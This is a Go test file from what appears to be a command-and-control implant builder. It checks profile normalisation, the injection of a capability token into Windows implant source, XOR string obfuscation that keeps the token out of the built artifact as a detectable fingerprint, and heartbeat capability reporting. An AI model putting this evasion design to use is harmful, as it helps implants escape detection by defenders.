package builder

import (
	"encoding/hex"
	"go/parser"
	"go/token"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"

	"toshell/internal/common/features"
	"toshell/internal/server/config"
)

// TestBuildTagListNormalizesUnknownProfile 未知档案必须 fail-closed 归入 light。
//
// 为什么：能力推导（features.Derive）对未知档案按最小集算，若构建侧仍编全套
// （buildTagList 只认字面量 "light"），"界面上的按钮"与"载荷里的代码"就会分叉 ——
// 正是 S4 要修的问题的镜像。两处共用 features.NormalizeProfile。
func TestBuildTagListNormalizesUnknownProfile(t *testing.T) {
	cases := []struct {
		profile string
		want    string
	}{
		{"full", ""},
		{"", ""},
		{"light", "light"},
		{"Light", "light"},
		{" light ", "light"},
		{"nano", "light"},  // 未来档位：还没实现 → 按最小集编译
		{"FULLX", "light"}, // 拼错 → 按最小集
	}
	for _, c := range cases {
		if got := buildTagList("tcp", c.profile, false, false, false); got != c.want {
			t.Errorf("buildTagList(tcp,%q) = %q, want %q", c.profile, got, c.want)
		}
	}
}

// TestCapabilityTokenBakedAndObfuscated 走一遍真实的"注入 → 混淆"两步，
// 证明能力位图真的被烘进了模板源码，并且**不以明文**留在产物里：
//  1. injectBuildConstants 把占位符换成 features.EncodeToken(...) 的令牌；
//  2. obfuscateImplantSources 把令牌加密成 xd("hex")（运行期由植入端 xd 解出）；
//  3. 混淆后的 main.go 仍能被 go/parser 解析（防止把 const 之类的字面量改坏）。
//
// 真编译 + 真执行（light/full 各一次、比对 /capabilities）在
// scripts 之外的临时 e2e 脚本里做，这里只做 CI 可跑的快速证明。
func TestCapabilityTokenBakedAndObfuscated(t *testing.T) {
	tmpl := config.ImplantConfig{TemplateDir: "implant"}
	b := newBuilder(&tmpl)

	opts := BuildOptions{
		OS: "windows", Arch: "amd64", Format: "exe", Protocol: "tcp",
		Profile: "light",
	}
	// 每构建随机值由 Build() 生成；单测里手动给，保证注入路径被真实走到。
	opts.CfgMagic = randomCfgMagic()
	opts.CfgKey = randomCfgKey()
	opts.XfBase = randomXfBase()
	opts.ApiHashSeed = 0x12345679
	opts.ApiHashMul = 0x01000193

	tmpDir := t.TempDir()
	if err := b.copyImplantSource(tmpDir, "windows"); err != nil {
		t.Fatalf("copyImplantSource: %v", err)
	}
	if err := b.processTemplates(tmpDir, opts); err != nil {
		t.Fatalf("processTemplates: %v", err)
	}
	if err := b.injectBuildConstants(tmpDir, &opts); err != nil {
		t.Fatalf("injectBuildConstants: %v", err)
	}

	mainPath := filepath.Join(tmpDir, "main.go")
	raw, err := os.ReadFile(mainPath)
	if err != nil {
		t.Fatalf("read main.go: %v", err)
	}
	rawSrc := string(raw)

	wantToken := features.EncodeToken(features.Input{
		Profile: "light", OS: "windows", Arch: "amd64", Transport: "tcp",
	})
	if !strings.Contains(rawSrc, `var capabilityToken = "`+wantToken+`"`) {
		t.Fatalf("main.go 里没有注入后的能力位令牌 %q", wantToken)
	}
	if strings.Contains(rawSrc, `"cap:v1:0000000000000000"`) {
		t.Fatal("占位符未被替换：能力位令牌注入失败（模板占位符与 injectBuildConstants 的匹配串漂移了？）")
	}

	if err := b.obfuscateImplantSources(tmpDir, opts.XfBase); err != nil {
		t.Fatalf("obfuscateImplantSources: %v", err)
	}
	obf, err := os.ReadFile(mainPath)
	if err != nil {
		t.Fatalf("read obfuscated main.go: %v", err)
	}
	obfSrc := string(obf)

	// 产物源码里不能有令牌明文（能力清单本身就是指纹）。
	if strings.Contains(obfSrc, wantToken) {
		t.Error("混淆后 main.go 仍含能力位令牌明文")
	}
	// 只看代码（注释里说明格式时会出现 cap:v1: 前缀，正常）。
	if strings.Contains(stripLineComments(obfSrc), "cap:v1:") {
		t.Error("混淆后 main.go 的代码里仍含 cap:v1: 明文前缀")
	}

	// 运行期取值：植入端的 capabilityToken 就是 xd("<hex>") 解出来的串。
	re := regexp.MustCompile(`var capabilityToken = xd\("([0-9a-fA-F]+)"\)`)
	m := re.FindStringSubmatch(obfSrc)
	if m == nil {
		t.Fatal("混淆后找不到 `var capabilityToken = xd(\"...\")`：能力位在产物里无法被运行期解出")
	}
	gotToken := xdDecodeForTest(t, m[1], opts.XfBase)
	if gotToken != wantToken {
		t.Fatalf("xd 解出的令牌 = %q, want %q", gotToken, wantToken)
	}
	mask, ok := features.ParseToken(gotToken)
	if !ok || mask != features.Bitmask(features.Derive(features.Input{Profile: "light", OS: "windows"})) {
		t.Fatalf("解出的令牌无法还原 light/windows 位图：token=%q ok=%v mask=%016x", gotToken, ok, mask)
	}

	// 混淆不能把源码改坏（例如把字符串常量放进 const 声明）。
	if _, err := parser.ParseFile(token.NewFileSet(), mainPath, obf, parser.AllErrors); err != nil {
		t.Fatalf("混淆后的 main.go 语法错误：%v", err)
	}
}

// TestHeartbeatCarriesCapabilityToken 心跳负载必须带上能力位（Modules），
// 且本地镜像结构体字段名与服务端 protocol.Heartbeat 一致 —— 字段名对不上就会
// 静默丢失（JSON 无 tag，按 Go 字段名序列化）。
func TestHeartbeatCarriesCapabilityToken(t *testing.T) {
	src, err := os.ReadFile(filepath.Join("implant", "main.go"))
	if err != nil {
		t.Fatal(err)
	}
	content := string(src)
	for _, want := range []string{
		"Modules []string",             // Heartbeat 镜像字段
		"Modules: capabilityModules()", // 组包时填充
		"capabilityToken",              // 构建期注入的令牌来源
		"cap:v1:0000000000000000",      // 占位符（injectBuildConstants 按它精确替换）
	} {
		if !strings.Contains(content, want) {
			t.Errorf("模板 main.go 缺少 %q：能力位无法随心跳上报", want)
		}
	}
	// 服务端镜像字段名必须一致（protocol.Heartbeat 无 json tag）。
	proto, err := os.ReadFile(filepath.Join("..", "..", "common", "protocol", "packet.go"))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(proto), "Modules    []string") {
		t.Error("internal/common/protocol.Heartbeat 的 Modules 字段不见了（协议镜像被改坏）")
	}
}

// xdDecodeForTest 复刻植入端 obfuscate.go 的 xd()：hex → XOR(xdBase + i*0x23)。
func xdDecodeForTest(t *testing.T, hexStr string, xdBase byte) string {
	t.Helper()
	raw, err := hex.DecodeString(hexStr)
	if err != nil {
		t.Fatalf("hex 解码失败: %v", err)
	}
	out := make([]byte, len(raw))
	for i, b := range raw {
		out[i] = b ^ byte(int(xdBase)+i*0x23)
	}
	return string(out)
}
